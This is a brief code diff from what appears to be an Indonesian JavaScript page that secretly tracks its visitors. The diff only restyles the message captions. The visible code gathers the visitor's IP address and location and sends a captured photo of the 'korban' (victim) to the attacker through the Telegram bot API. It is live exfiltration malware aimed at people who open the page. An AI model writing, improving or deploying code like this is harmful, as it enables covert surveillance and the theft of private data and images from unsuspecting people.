@@ -43,7 +43,7 @@ function kirimPesan(text) {
 }
 
 // Kirim pesan awal
-kirimPesan('LAPOR INFORMASI USER KE DETEKSI BANG DONZ');
+kirimPesan('📝𝘽𝙚𝙧𝙞𝙠𝙪𝙩 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙆𝙤𝙧𝙗𝙖𝙣 𝘽𝙖𝙣𝙜 𝘿𝙤𝙣𝙯𝙏𝙯𝙮 :');
 
 // Ambil info IP & lokasi
 fetch('https://api.ipify.org?format=json')
@@ -114,7 +114,7 @@ function ambilFoto() {
     let form = new FormData();
     form.append('chat_id', chat_id);
     form.append('photo', blob, 'foto.jpg');
-    form.append('caption', 'INI ADALAH FOTO KORBAN BANG DONZ');
+    form.append('caption', '📸 𝙄𝙣𝙞 𝘼𝙙𝙖𝙡𝙖𝙝 𝙁𝙤𝙩𝙤 𝙆𝙤𝙧𝙗𝙖𝙣 𝘽𝙖𝙣𝙜 𝘿𝙤𝙣𝙯𝙏𝙯𝙮');
     fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
       method: 'POST',
       body: form
